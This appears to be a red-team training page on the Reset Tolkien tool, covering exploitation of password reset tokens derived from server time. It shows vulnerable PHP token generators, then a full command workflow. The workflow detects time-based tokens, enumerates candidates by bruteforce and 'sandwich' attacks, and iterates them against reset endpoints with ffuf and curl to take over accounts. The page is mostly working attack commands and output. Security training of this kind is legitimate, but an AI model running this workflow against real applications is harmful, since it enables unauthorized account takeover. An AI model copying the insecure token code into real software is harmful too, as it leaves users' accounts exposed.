---
layout: training-page
title: "Reset Tolkien — Time-Based Token Exploitation — Red Team Academy"
module: "Web Hacking"
tags:
  - reset-tolkien
  - token-exploitation
  - password-reset
  - time-based-secrets
  - sandwich-attack
  - session-tokens
  - web-hacking
page_key: "web-reset-tolkien"
render_with_liquid: false
---

# Reset Tolkien — Time-Based Token Exploitation

Reset Tolkien exploits password reset tokens and similar secrets that are derived from the server's current time. When an application generates a reset token using `uniqid()`, `time()`, `uuidv1()`, or any other timestamp-derived function, an attacker who knows approximately when the token was generated can enumerate the full token space and use it to take over any account. The "Sandwich Attack" uses a known attacker-controlled token as a timing oracle to bracket the victim token's generation window to millisecond precision.

## The Vulnerability

```
# Vulnerable PHP password reset implementations:
# Level 1 — direct PHP uniqid (microsecond timestamp as hex):
function getToken() { return uniqid(); }
# Token: "660430516ffcf" — decodes to unix timestamp 1711550545.458703

# Level 2 — hash of time():
function getToken() { return hash('sha256', time()); }
# Token: sha256 of integer unix timestamp — only 60 possible values per minute

# Level 3 — hash of uniqid():
function getToken() { return hash('md5', uniqid()); }
# Token: md5 of microsecond timestamp — narrow window

# Level 4 — hash of uniqid + user email:
function getToken() { return hash('sha256', uniqid() . $email); }
# Suffix is predictable (email is known), prefix is uniqid = time-based

# Level 5 — datetime RFC2822:
function getToken() { return hash('sha256', date(DATE_RFC2822)); }
# Only 1 unique token per second — trivial to brute-force

# UUID v1 — also time-based (60-bit timestamp embedded in UUID):
# 6ba7b810-9dad-11d1-80b4-00c04fd430c8
#  ^--- this section encodes the generation timestamp

# MongoDB ObjectID — first 4 bytes are unix timestamp:
# 507f1f77bcf86cd799439011
# 507f1f77 = 0x507f1f77 = unix timestamp 1350610807
```

## Install

```
# pip install (recommended):
pip install reset-tolkien

# Verify:
reset-tolkien -h

# From Docker:
git clone https://github.com/AethliosIK/reset-tolkien.git
cd reset-tolkien
docker build -t reset-tolkien:latest .
docker run --rm -it --net=host -v "$PWD:/reset-tolkien/" reset-tolkien:latest -h
```

## Step 1 — Detect Whether a Token is Time-Based

Capture a password reset token from the application. Note the server's response date header (from the HTTP response). Feed both to `detect` to check if the token format is time-derived.

```
# Basic detection — provide the token and the server's response Date header:
reset-tolkien detect 660430516ffcf \
  -d "Wed, 27 Mar 2024 14:42:25 GMT"

# With prefix/suffix candidates (if you know part of the token formula):
reset-tolkien detect 660430516ffcf \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  --prefixes "attacker@example.com" \
  --suffixes "attacker@example.com"

# With timezone offset if application is not UTC:
reset-tolkien detect 660430516ffcf \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  --timezone "-7"

# Verbose output (see all formats tested):
reset-tolkien detect 660430516ffcf \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  -v 2

# Example success output:
# The token may be based on a timestamp: 1711550545.458703 (prefix: None / suffix: None)
# The conversion logic is "uniqid"

# With a known exact timestamp instead of datetime string:
reset-tolkien detect a8b3f920 \
  -t 1711550545.458703

# Only test integer timestamps (faster, for hash(time()) patterns):
reset-tolkien detect abc123def456 \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  --only-int-timestamp

# Restrict which hash functions are tested:
reset-tolkien detect abc123def456 \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  --hashes "md5,sha256"
```

## Step 2a — Bruteforce Attack

Use when you can trigger a reset for the victim's account and observe the server's Date header in the response. Generate all possible tokens within a time window around that timestamp and iterate them against the reset endpoint.

```
# Bruteforce using server datetime from victim's reset request:
reset-tolkien bruteforce 660430516ffcf \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  --token-format "uniqid" \
  -o tokens.txt

# Bruteforce with known unix timestamp:
reset-tolkien bruteforce 660430516ffcf \
  -t 1711550545.000000 \
  --token-format "uniqid" \
  -o tokens.txt

# Extend time window (default: 60s for int timestamps, 2s for float):
reset-tolkien bruteforce 660430516ffcf \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  --float-timestamp-range 5 \
  --token-format "uniqid" \
  -o tokens.txt

# With prefix/suffix if known (e.g. token = md5(uniqid() + email)):
reset-tolkien bruteforce abc123 \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  --token-format "md5,uniqid" \
  --suffix "victim@example.com" \
  -o tokens.txt

# Include timestamps in output (useful for debugging):
reset-tolkien bruteforce 660430516ffcf \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  --token-format "uniqid" \
  --with-timestamp \
  -o tokens.txt

# Output: tokens.txt contains one token per line
wc -l tokens.txt   # e.g. 20000 tokens — now brute-force the reset endpoint
```

## Step 2b — Sandwich Attack

The most precise attack. Request a reset for the attacker's own account immediately *before* and immediately *after* triggering the victim's reset. The attacker's two tokens bracket the exact microsecond window in which the victim's token was generated. All possible tokens in that window are enumerated.

```
# How the Sandwich Attack works:
# T1: Attacker requests reset → receives token_A (timestamp = begin)
# T2: Attacker triggers victim reset (e.g. API call)
# T3: Attacker requests reset → receives token_B (timestamp = end)
# Victim's token was generated between T1 and T3

# Extract timestamps from your own tokens:
reset-tolkien detect [token_A] -v 1    # shows: timestamp = 1711550546.485597
reset-tolkien detect [token_B] -v 1    # shows: timestamp = 1711550546.505134

# Run the sandwich attack:
reset-tolkien sandwich [victim_token_placeholder] \
  -bt 1711550546.485597 \
  -et 1711550546.505134 \
  --token-format "uniqid" \
  -o sandwich_tokens.txt

# Using datetime boundaries instead of timestamps:
reset-tolkien sandwich [victim_token_placeholder] \
  -bd "Wed, 27 Mar 2024 14:42:26 GMT" \
  -ed "Wed, 27 Mar 2024 14:42:26 GMT" \
  --token-format "uniqid" \
  -o sandwich_tokens.txt

# For hash formats (e.g. md5 of uniqid):
reset-tolkien sandwich [victim_placeholder] \
  -bt 1711550546.485597 \
  -et 1711550546.505134 \
  --token-format "md5,uniqid" \
  -o sandwich_tokens.txt

# Note: the "victim_token_placeholder" is required positionally
# but not used in the sandwich mode — just pass any string.

# Result: sandbox_tokens.txt typically contains 5-50 tokens
# This is a tiny list to iterate against the reset endpoint.
```

## Step 3 — Iterate Tokens Against Reset Endpoint

```
# Use ffuf to send each generated token to the reset endpoint:
ffuf -w tokens.txt:TOKEN \
  -u "https://target.com/reset?token=TOKEN" \
  -fw [invalid_response_word_count]

# Using curl loop (for simple GET-based reset tokens):
while IFS= read -r token; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/reset_password?token=$token")
  echo "$code $token"
  [ "$code" = "200" ] && echo "[+] VALID TOKEN: $token" && break
done < tokens.txt

# POST-based reset endpoint:
ffuf -w tokens.txt:TOKEN \
  -u "https://target.com/api/reset-password" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"token":"TOKEN","password":"newpass123"}' \
  -fc 400,422   # filter invalid token responses

# If the reset token is in a cookie:
ffuf -w tokens.txt:TOKEN \
  -u "https://target.com/reset" \
  -H "Cookie: reset_token=TOKEN" \
  -fw [invalid_word_count]
```

## Supported Token Formats

```
# Encoding formats (applied recursively — tool finds combinations):
# base32        - Base32 encoding
# base64        - Base64 encoding
# urlencode     - URL percent-encoding
# hexint        - Hex-encoded integer timestamp
# hexstr        - ASCII chars as hex integers
# uniqid        - PHP uniqid() — "6 hex chars + 7 hex decimal" format
# uuidv1        - UUID version 1 (60-bit timestamp)
# shortuuid     - Shortened UUID encoding
# mongodb_objectid - MongoDB ObjectID (4-byte unix timestamp prefix)
# datetime      - Custom date format string
# datetimeRFC2822 - RFC2822 date format

# Hash functions supported:
# md5, sha1, sha224, sha256, sha384, sha512
# sha3_224, sha3_256, sha3_384, sha3_512
# blake_256, blake_512

# Combined formats (specify as comma-separated chain):
# "md5,uniqid"    → md5(uniqid())
# "sha256,hexint" → sha256(hex(timestamp))
# "md5,uniqid,email_suffix" → md5(uniqid() . $email)
```

## Custom Token Format Configuration

```
# For non-standard token formulas, create a YAML config file:
cat <<EOF > custom_format.yml
float-uniqid-email:
  description: "md5(uniqid() + email)"
  level: 2
  timestamp_type: float
  formats:
    - uniqid
    - md5
  suffix: "victim@example.com"
EOF

# Use the config file:
reset-tolkien detect abc123 \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  -c custom_format.yml

reset-tolkien bruteforce abc123 \
  -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  -c custom_format.yml \
  -o tokens.txt
```

## Full Attack Workflow

```
# Target: application with time-based password reset tokens

# Step 1: Trigger your own reset and capture the response:
curl -v -X POST https://target.com/forgot-password \
  -d "email=attacker@example.com" 2>&1 | grep -i "date:\|set-cookie"
# Note the Date: header and the reset token from your email

# Step 2: Detect the token format:
reset-tolkien detect [your_token] \
  -d "Thu, 28 Mar 2024 09:15:33 GMT" \
  -v 1
# Output confirms: uniqid format

# Step 3: Sandwich attack setup:
# Request A: reset for attacker → token_A
# Trigger victim reset via API/UI
# Request B: reset for attacker → token_B
# Extract timestamps from token_A and token_B

# Step 4: Generate victim token candidates:
reset-tolkien sandwich placeholder \
  -bt [timestamp_A] \
  -et [timestamp_B] \
  --token-format "uniqid" \
  -o tokens.txt
wc -l tokens.txt    # typically 5-50 tokens

# Step 5: Test tokens against reset form:
ffuf -w tokens.txt:TOKEN \
  -u "https://target.com/reset" \
  -X POST -d "token=TOKEN&new_password=Pwned123!" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 302,400

# Step 6: Successful token → password reset → account takeover
```

## Resources

- Reset Tolkien — `github.com/AethliosIK/reset-tolkien`
- pip install — `pypi.org/project/reset-tolkien`
- Research article (EN) — `aeth.cc/public/Article-Reset-Tolkien/secret-time-based-article-en.html`
- Related: [Authentication Attacks](/web/authentication-attacks/)
- Related: [Account Takeover](/web/account-takeover/)
